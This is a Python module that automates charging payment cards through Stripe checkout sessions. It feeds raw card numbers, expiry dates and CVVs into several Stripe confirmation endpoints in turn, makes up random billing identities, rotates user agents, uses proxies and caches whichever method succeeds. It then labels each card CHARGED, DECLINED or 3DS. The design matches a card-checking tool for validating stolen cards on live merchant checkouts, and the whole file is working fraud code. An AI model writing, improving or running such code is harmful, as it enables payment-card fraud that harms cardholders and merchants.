# -*- coding: utf-8 -*-
"""Stripe charge with session-based approach.
1. Fetch checkout page → get cookies + session context
2. Send raw card data directly in confirm call (skip token/PM creation)
3. Fallback to token-based and PM-based methods
"""
import time
import asyncio
import re
import aiohttp

from billing_data import (
    random_full_name, random_email, random_address,
    random_user_agent, random_timezone, random_locale,
    build_stripe_headers, build_stripe_headers_js,
)

_session = None
_site_method_cache: dict[str, str] = {}
_checkout_cookies_cache: dict[str, dict] = {}


async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None


def _is_surface_error(data: dict) -> bool:
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    return "integration surface" in msg or "unsupported for publishable key" in msg


def _extract_pi_info(init_data: dict) -> tuple[str, str]:
    pi = init_data.get("payment_intent") or {}
    client_secret = pi.get("client_secret", "")
    pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
    return pi_id, client_secret


def _get_amounts(init_data: dict) -> tuple[int, int]:
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)
    if inv:
        return inv.get("total", 0), inv.get("subtotal", 0)
    pi = init_data.get("payment_intent") or {}
    amt = pi.get("amount", 0)
    return amt, amt


def _get_billing(init_data: dict) -> dict:
    cust = init_data.get("customer") or {}
    addr = cust.get("address") or {}
    billing = random_address()
    return {
        "name": cust.get("name") or billing["name"],
        "email": init_data.get("customer_email") or random_email(),
        "country": addr.get("country") or billing["country"],
        "line1": addr.get("line1") or billing["line1"],
        "city": addr.get("city") or billing["city"],
        "state": addr.get("state") or billing["state"],
        "postal_code": addr.get("postal_code") or billing["postal_code"],
    }


def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
    if _is_surface_error(conf):
        return None
    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        msg = err.get("message", "Failed")
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
    pi = conf.get("payment_intent") or {}
    st = pi.get("status", "") or conf.get("status", "")
    if st == "succeeded":
        return "CHARGED", "Charged"
    if st == "requires_action":
        return "3DS", "3DS Required"
    if st == "requires_payment_method":
        return "DECLINED", "Declined"
    return "UNKNOWN", st or "Unknown"


def _billing_params(prefix: str, b: dict) -> str:
    return (
        f"&{prefix}[name]={b['name']}"
        f"&{prefix}[email]={b['email']}"
        f"&{prefix}[address][country]={b['country']}"
        f"&{prefix}[address][line1]={b['line1']}"
        f"&{prefix}[address][city]={b['city']}"
        f"&{prefix}[address][postal_code]={b['postal_code']}"
        f"&{prefix}[address][state]={b['state']}"
    )


def _card_pm_data(card: dict) -> str:
    return (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][number]={card['cc']}"
        f"&payment_method_data[card][exp_month]={card['mm']}"
        f"&payment_method_data[card][exp_year]={card['yy']}"
        f"&payment_method_data[card][cvc]={card['cvv']}"
    )


async def _fetch_checkout_cookies(checkout_url: str, proxy_url: str | None = None) -> dict:
    """Visit checkout page to establish session cookies."""
    cs_match = re.search(r"cs_(live|test)_[A-Za-z0-9]+", checkout_url)
    cache_key = cs_match.group(0) if cs_match else checkout_url
    if cache_key in _checkout_cookies_cache:
        return _checkout_cookies_cache[cache_key]

    cookies = {}
    try:
        ua = random_user_agent()
        page_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": ua,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
        }
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(
                checkout_url, headers=page_headers, proxy=proxy_url,
                allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                for k, v in r.cookies.items():
                    cookies[k] = v.value
                await r.read()
    except Exception:
        pass

    _checkout_cookies_cache[cache_key] = cookies
    return cookies


async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url):
    """Send raw card data directly in payment_pages/confirm (no token/PM step)."""
    b = _get_billing(init_data)
    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")

    body = (
        f"eid=NA&{_card_pm_data(card)}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url):
    """Send raw card data directly in PaymentIntent/confirm."""
    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    b = _get_billing(init_data)
    body = (
        f"{_card_pm_data(card)}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_token_pi(s, card, pk, init_data, headers, proxy_url):
    """Create token then confirm PaymentIntent."""
    token_body = (
        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/tokens",
        headers=headers, data=token_body, proxy=proxy_url,
    ) as r:
        tok = await r.json()

    if _is_surface_error(tok):
        return None
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]
    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    b = _get_billing(init_data)
    confirm_body = (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"{_billing_params('payment_method_data[billing_details]', b)}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=confirm_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url):
    """Create PaymentMethod then confirm via payment_pages."""
    b = _get_billing(init_data)
    pm_body = (
        f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"{_billing_params('billing_details', b)}&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers, data=pm_body, proxy=proxy_url,
    ) as r:
        pm = await r.json()

    if _is_surface_error(pm):
        return None
    if "error" in pm:
        return "DECLINED", pm["error"].get("message", "Card error")[:60]
    pm_id = pm.get("id")
    if not pm_id:
        return "FAILED", "No PM"

    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    conf_body = (
        f"eid=NA&payment_method={pm_id}&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict,
    checkout_url: str = "",
    proxy_url: str | None = None,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    cached = _site_method_cache.get(cs)

    if checkout_url:
        await _fetch_checkout_cookies(checkout_url, proxy_url)

    for attempt in range(max_retries + 1):
        try:
            ua = random_user_agent()
            h_checkout = build_stripe_headers(ua, origin="https://checkout.stripe.com")
            h_js = build_stripe_headers_js(ua)
            locale = random_locale()
            tz = random_timezone()

            cookies = _checkout_cookies_cache.get(cs, {})
            if cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                h_checkout["cookie"] = cookie_str
                h_js["cookie"] = cookie_str

            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=25, connect=8),
            ) as s:
                all_methods = [
                    ("DP", lambda: _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url)),
                    ("DI", lambda: _method_direct_pi(s, card, pk, init_data, h_checkout, proxy_url)),
                    ("DP_JS", lambda: _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url)),
                    ("DI_JS", lambda: _method_direct_pi(s, card, pk, init_data, h_js, proxy_url)),
                    ("TK", lambda: _method_token_pi(s, card, pk, init_data, h_checkout, proxy_url)),
                    ("TK_JS", lambda: _method_token_pi(s, card, pk, init_data, h_js, proxy_url)),
                    ("PM", lambda: _method_pm_pages(s, card, pk, cs, init_data, h_checkout, proxy_url)),
                ]

                if cached:
                    ordered = [m for m in all_methods if m[0] == cached]
                    ordered += [m for m in all_methods if m[0] != cached]
                else:
                    ordered = all_methods

                res = None
                for method_name, method_fn in ordered:
                    try:
                        res = await method_fn()
                    except Exception:
                        res = None
                    if res is not None:
                        _site_method_cache[cs] = method_name
                        break

                if res is None:
                    result["status"] = "FAILED"
                    result["response"] = "All methods unsupported"
                else:
                    result["status"], result["response"] = res

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e).lower()
            retryable = any(kw in err_str for kw in ("disconnect", "timeout", "connection", "reset"))
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result


async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    checkout_url = checkout_data.get("url", "")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, checkout_url, proxy_url)
